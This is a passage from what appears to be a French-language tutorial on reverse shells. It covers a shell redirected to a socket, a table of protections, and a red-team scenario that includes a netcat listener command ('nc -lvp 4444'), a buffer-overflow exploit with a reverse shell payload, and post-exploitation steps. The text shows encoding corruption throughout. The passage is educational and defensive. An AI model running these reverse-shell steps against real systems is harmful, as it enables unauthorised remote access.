   â”œâ”€ /bin/sh avec fd 0/1/2 â†’ socket
```

### 8.2 Protections

```ascii
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Protection       â”‚ Comment Ã§a aide            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Firewall sortant â”‚ Bloque connexions externes â”‚
â”‚ SELinux/AppArmor â”‚ Restreint execve()         â”‚
â”‚ Network Monitor  â”‚ DÃ©tecte flux suspects      â”‚
â”‚ Process Monitor  â”‚ Alerte sur shells inattendusâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## 9. Cas d'Usage Red Team

```ascii
SCÃ‰NARIO PENTEST :

1. Reconnaissance
   â”œâ”€ Scan rÃ©seau (nmap)
   â””â”€ Identifier cible : 192.168.1.50

2. Exploitation
   â”œâ”€ Trouver vulnÃ©rabilitÃ© (buffer overflow)
   â””â”€ CrÃ©er exploit avec reverse shell payload

3. Listener
   â”œâ”€ Lancer : nc -lvp 4444
   â””â”€ Attendre connexion

4. Exploitation
   â”œâ”€ Envoyer exploit
   â””â”€ Shellcode s'exÃ©cute sur victime

5. Post-Exploitation
   â”œâ”€ Shell reÃ§u
   â”œâ”€ Escalade privilÃ¨ges
   â”œâ”€ Persistence
   â””â”€ Lateral movement
```

## Ressources

- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Netcat Guide](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
- [Socket Programming](https://beej.us/guide/bgnet/)

